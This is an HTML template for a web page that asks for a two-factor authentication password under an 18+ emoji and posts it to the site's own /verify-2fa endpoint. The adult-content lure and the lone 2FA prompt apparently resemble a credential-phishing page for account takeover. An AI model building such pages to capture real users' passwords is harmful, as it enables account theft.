<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title data-i18n="enter_password">Enter password</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
    <div class="auth-container">
        <div class="glass">
            <div class="emoji-18plus">üîû</div>

            <h1 class="auth-title" data-i18n="enter_password">Two-factor authentication</h1>
            
            <p class="auth-subtitle" data-i18n="password">2FA Password</p>

            <form id="passwordForm">
                <div class="input-group">
                    <input 
                        type="password" 
                        class="input-field" 
                        id="password" 
                        placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢"
                        data-i18n="password"
                        required
                    >
                </div>

                <button type="submit" class="btn btn-primary" data-i18n="verify_password">
                    Verify password
                </button>
            </form>

            <a href="/" class="back-link" data-i18n="back">‚Üê Back</a>

            <div id="errorMessage" class="error-message" style="display: none;"></div>
        </div>
    </div>

    <script src="{{ url_for('static', filename='i18n.js') }}"></script>
    <script>
        document.getElementById('passwordForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const password = document.getElementById('password').value;
            
            if (!password) {
                alert(window.i18n?.t('password_required') || 'Enter password');
                return;
            }

            try {
                const response = await fetch('/verify-2fa', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ password: password })
                });

                if (response.ok) {
                    window.location.href = '/success';
                } else {
                    const error = await response.json();
                    document.getElementById('errorMessage').textContent = error.error || 'Invalid password';
                    document.getElementById('errorMessage').style.display = 'block';
                }
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('errorMessage').textContent = 'Server error';
                document.getElementById('errorMessage').style.display = 'block';
            }
        });
    </script>
</body>
</html>
